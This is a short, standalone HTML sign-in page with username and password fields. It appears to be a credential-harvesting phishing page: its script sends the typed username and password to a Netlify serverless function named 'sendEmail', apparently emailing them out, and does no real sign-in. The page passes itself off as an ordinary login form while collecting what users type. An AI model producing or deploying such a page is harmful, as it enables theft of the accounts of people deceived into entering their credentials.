<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in</title>
<style>
* { box-sizing: border-box; font-family: Arial, sans-serif; }
body { margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background: linear-gradient(to bottom, #e6f0fa, #cfe2f3);}
.login-container {width:360px; background:#fff; padding:35px; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.2);}
input {width:100%; padding:12px; margin:10px 0 15px 0; border:1px solid #ccc; border-radius:6px; font-size:14px;}
button {width:100%; padding:12px; background:#117aca; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer;}
button:hover {background:#0d5f9c;}
</style>
</head>
<body>
<div class="login-container">
<h2>Sign in</h2>
<input type="text" id="username" placeholder="Username">
<input type="password" id="password" placeholder="Password">
<button onclick="submitForm()">Sign In</button>
</div>

<script>
function submitForm(){
const formData = {
username: document.getElementById("username").value,
password: document.getElementById("password").value
};

fetch("/.netlify/functions/sendEmail", {
method: "POST",
headers: {"Content-Type":"application/json"},
body: JSON.stringify(formData)
})
.then(res=>res.json())
.then(data=>alert(data.message))
.catch(err=>console.error(err));
}
</script>
</body>
</html>
